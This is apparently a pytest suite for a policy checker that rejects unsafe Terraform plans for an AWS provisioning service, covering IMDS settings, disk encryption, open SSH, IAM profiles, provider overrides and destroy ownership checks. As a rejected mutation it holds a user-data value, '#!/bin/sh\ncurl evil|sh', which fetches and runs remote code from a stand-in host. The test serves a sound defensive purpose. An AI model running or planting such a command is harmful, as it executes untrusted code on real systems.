"""Plan policy against JSON produced by the real pinned Terraform (offline, fake creds).

``fixtures/terraform_plan_create.json`` is ``terraform show -json`` output from the
reviewed template. The only edit is ``configuration.provider_config``, restored to the
production template's expressions after the offline harness override.
"""

from __future__ import annotations

import copy
import json
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from unitcompute.provisioning.base import DeploymentSpec, NetworkTargets, OwnedResource
from unitcompute.provisioning.policy import evaluate_plan

FIXTURE = Path(__file__).parent / "fixtures" / "terraform_plan_create.json"
SPEC = DeploymentSpec(
    deployment_id="dep_0123456789abcdef0123456789abcdef",
    owner_tag="0123456789abcdef",
    name="demo",
    disk_gib=8,
    region="us-east-1",
    instance_type="t3.micro",
)
TARGETS = NetworkTargets(
    account_id="123456789012",
    vpc_id="vpc-0123456789abcdef0",
    subnet_id="subnet-0123456789abcdef0",
    instance_profile_name="unitcompute-ssm",
)
AMI = "ami-0123456789abcdef0"


def load() -> dict[str, Any]:
    data: dict[str, Any] = json.loads(FIXTURE.read_text())
    return data


def change(plan: dict[str, Any], address: str) -> dict[str, Any]:
    found: dict[str, Any] = next(c for c in plan["resource_changes"] if c["address"] == address)
    return found


def run(
    plan: dict[str, Any], kind: str = "create", inventory: list[OwnedResource] | None = None
) -> list[str]:
    return evaluate_plan(
        plan,
        kind=kind,
        spec=SPEC,
        targets=TARGETS,
        ami_id=AMI,  # type: ignore[arg-type]
        inventory=inventory or [],
    ).violations


def as_destroy(plan: dict[str, Any]) -> dict[str, Any]:
    """Build the destroy-plan shape from the created resources (before=after+ids)."""
    destroy = copy.deepcopy(plan)
    resources = []
    for c in destroy["resource_changes"]:
        values = dict(c["change"]["after"])
        values["id"] = "i-0abc" if c["type"] == "aws_instance" else "sg-0abc"
        if c["type"] == "aws_instance":
            values["root_block_device"][0]["volume_id"] = "vol-0abc"
            values["vpc_security_group_ids"] = ["sg-0abc"]
        c["change"] = {"actions": ["delete"], "before": values, "after": None}
        resources.append({"address": c["address"], "values": values})
    destroy["prior_state"] = {"values": {"root_module": {"resources": resources}}}
    return destroy


def test_real_terraform_plan_passes() -> None:
    result = evaluate_plan(
        load(), kind="create", spec=SPEC, targets=TARGETS, ami_id=AMI, inventory=[]
    )
    assert result.violations == []
    assert {c["address"] for c in result.changes} == {"aws_instance.vm", "aws_security_group.vm"}


def _set(path: list[Any], value: Any) -> Callable[[dict[str, Any]], None]:
    def mutate(plan: dict[str, Any]) -> None:
        target: Any = change(plan, path[0])["change"]["after"]
        for key in path[1:-1]:
            target = target[key]
        target[path[-1]] = value

    return mutate


def _add_resource(
    address: str, rtype: str, mode: str = "managed"
) -> Callable[[dict[str, Any]], None]:
    def mutate(plan: dict[str, Any]) -> None:
        plan["resource_changes"].append(
            {
                "address": address,
                "mode": mode,
                "type": rtype,
                "name": "x",
                "provider_name": "registry.terraform.io/hashicorp/aws",
                "change": {"actions": ["create"], "before": None, "after": {}},
            }
        )

    return mutate


def _actions(address: str, actions: list[str]) -> Callable[[dict[str, Any]], None]:
    def mutate(plan: dict[str, Any]) -> None:
        change(plan, address)["change"]["actions"] = actions

    return mutate


INST = "aws_instance.vm"
SG = "aws_security_group.vm"

MUTATIONS: dict[str, Callable[[dict[str, Any]], None]] = {
    "imdsv1": _set([INST, "metadata_options", 0, "http_tokens"], "optional"),
    "imds_hops": _set([INST, "metadata_options", 0, "http_put_response_hop_limit"], 2),
    "unencrypted": _set([INST, "root_block_device", 0, "encrypted"], False),
    "keep_disk": _set([INST, "root_block_device", 0, "delete_on_termination"], False),
    "gp2": _set([INST, "root_block_device", 0, "volume_type"], "gp2"),
    "disk_size": _set([INST, "root_block_device", 0, "volume_size"], 500),
    "user_data": _set([INST, "user_data"], "#!/bin/sh\ncurl evil|sh"),
    "user_data_b64": _set([INST, "user_data_base64"], "IyEvYmluL3No"),
    "other_ami": _set([INST, "ami"], "ami-0fffffffffffffff0"),
    "big_instance": _set([INST, "instance_type"], "p5.48xlarge"),
    "unlimited_credits": _set([INST, "credit_specification", 0, "cpu_credits"], "unlimited"),
    "other_subnet": _set([INST, "subnet_id"], "subnet-0ffffffffffffffff"),
    "admin_profile": _set([INST, "iam_instance_profile"], "AdminProfile"),
    "no_public_ip": _set([INST, "associate_public_ip_address"], False),
    "extra_volume": _set([INST, "ebs_block_device"], [{"volume_size": 1000}]),
    "foreign_tags": _set([INST, "tags", "UnitComputeDeployment"], "dep_" + "f" * 32),
    "ssh_ingress": _set(
        [SG, "ingress"],
        [{"from_port": 22, "to_port": 22, "protocol": "tcp", "cidr_blocks": ["0.0.0.0/0"]}],
    ),
    "egress_all": _set([SG, "egress", 0, "protocol"], "-1"),
    "egress_ports": _set([SG, "egress", 0, "to_port"], 65535),
    "other_vpc": _set([SG, "vpc_id"], "vpc-0ffffffffffffffff"),
    "iam_role": _add_resource("aws_iam_role.x", "aws_iam_role"),
    "second_vm": _add_resource("aws_instance.extra", "aws_instance"),
    "data_source": _add_resource(
        "data.aws_iam_policy_document.x", "aws_iam_policy_document", "data"
    ),
    "replace_vm": _actions(INST, ["delete", "create"]),
    "update_sg": _actions(SG, ["update"]),
    "delete_in_create": _actions(SG, ["delete"]),
}


@pytest.mark.parametrize("name", sorted(MUTATIONS))
def test_policy_rejects_mutation(name: str) -> None:
    plan = load()
    MUTATIONS[name](plan)
    assert run(plan), f"mutation {name} was not rejected"


@pytest.mark.parametrize(
    "mutate, expected",
    [
        (lambda p: p.update(errored=True), "errored"),
        (
            lambda p: p["variables"]["subnet_id"].update(value="subnet-0ffffffffffffffff"),
            "subnet_id",
        ),
        (lambda p: p["variables"]["region"].update(value="eu-west-1"), "region"),
        (lambda p: p["variables"].update(extra={"value": 1}), "unexpected variables"),
        (
            lambda p: p["configuration"]["provider_config"]["aws"]["expressions"].update(
                endpoints={"constant_value": "https://evil"}
            ),
            "provider arguments",
        ),
        (lambda p: p["configuration"]["provider_config"].update(null={}), "unexpected providers"),
        (lambda p: p["configuration"]["root_module"].update(module_calls={"m": {}}), "modules"),
        (lambda p: change(p, INST).update(provider_name="registry.example/evil/aws"), "provider"),
        (lambda p: p["resource_changes"].pop(), "exactly one VM"),
    ],
)
def test_plan_level_violations(mutate: Callable[[dict[str, Any]], None], expected: str) -> None:
    plan = load()
    mutate(plan)
    assert any(expected in v for v in run(plan)), run(plan)


def test_destroy_plan_passes_with_data_loss_warning() -> None:
    result = evaluate_plan(
        as_destroy(load()),
        kind="destroy",
        spec=SPEC,
        targets=TARGETS,
        ami_id=None,
        inventory=[
            OwnedResource("instance", "i-0abc", "running"),
            OwnedResource("volume", "vol-0abc", "in-use"),
            OwnedResource("security_group", "sg-0abc", "exists"),
        ],
    )
    assert result.violations == []
    assert any("permanently deletes" in w for w in result.warnings)
    assert {c["action"] for c in result.changes} == {"delete"}


def test_destroy_refuses_resources_owned_by_other_deployment() -> None:
    plan = as_destroy(load())
    change(plan, INST)["change"]["before"]["tags"]["UnitComputeDeployment"] = "dep_" + "e" * 32
    assert any("not tagged as owned" in v for v in run(plan, "destroy"))


def test_destroy_refuses_creates() -> None:
    plan = as_destroy(load())
    change(plan, SG)["change"]["actions"] = ["create"]
    assert run(plan, "destroy")


def test_orphaned_resources_require_operator() -> None:
    orphan = OwnedResource("instance", "i-0orphan", "running")
    violations = run(load(), inventory=[orphan])
    assert any("i-0orphan" in v and "operator" in v for v in violations)


def test_no_op_requires_ownership_tags() -> None:
    plan = as_destroy(load())
    for c in plan["resource_changes"]:
        c["change"]["actions"] = ["no-op"]
        c["change"]["after"] = c["change"]["before"]
    inventory = [
        OwnedResource("instance", "i-0abc", "running"),
        OwnedResource("security_group", "sg-0abc", "exists"),
    ]
    assert run(plan, inventory=inventory) == []
    change(plan, SG)["change"]["before"]["tags"] = {}
    assert run(plan, inventory=inventory)


@pytest.mark.parametrize("actions", [["delete", "create"], ["create", "delete"], ["update"]])
def test_replace_or_update_of_owned_resources_rejected(actions: list[str]) -> None:
    """Even correctly owned resources may not be replaced or updated in place."""
    plan = as_destroy(load())
    for c in plan["resource_changes"]:
        c["change"]["actions"] = ["no-op"]
        c["change"]["after"] = c["change"]["before"]
    change(plan, INST)["change"]["actions"] = actions
    inventory = [
        OwnedResource("instance", "i-0abc", "running"),
        OwnedResource("security_group", "sg-0abc", "exists"),
    ]
    expected = f"action {'/'.join(actions)} on aws_instance.vm is not allowed for a create plan"
    assert expected in run(plan, inventory=inventory)
